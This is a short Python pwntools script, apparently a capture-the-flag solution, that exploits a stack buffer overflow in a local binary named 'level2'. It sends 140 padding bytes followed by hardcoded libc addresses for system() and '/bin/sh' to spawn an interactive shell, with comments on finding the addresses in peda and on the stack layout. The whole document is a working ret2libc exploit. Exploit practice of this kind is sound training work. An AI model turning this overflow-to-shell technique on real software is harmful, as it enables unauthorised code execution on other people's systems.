#!/usr/bin/env python
from pwn import *
from pwnlib import gdb

p = process('./level2')
#context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(p)
'''
in peda:
    searchmem '/bin/sh' libc
'''
bin_sh_addr = 0xf7f73a8c
'''
in peda:
    print system
'''
ret2system = 0xf7e55e70
ret2oops = 0xcfcfcfcf
'''
    system('/bin/sh')
stack:
    arg2
    arg1
    new_ret
    ret
    'A' * 140
'''
payload = 'A' * 140 + p32(ret2system) + p32(ret2oops) + p32(bin_sh_addr)

p.send(payload)
p.interactive()
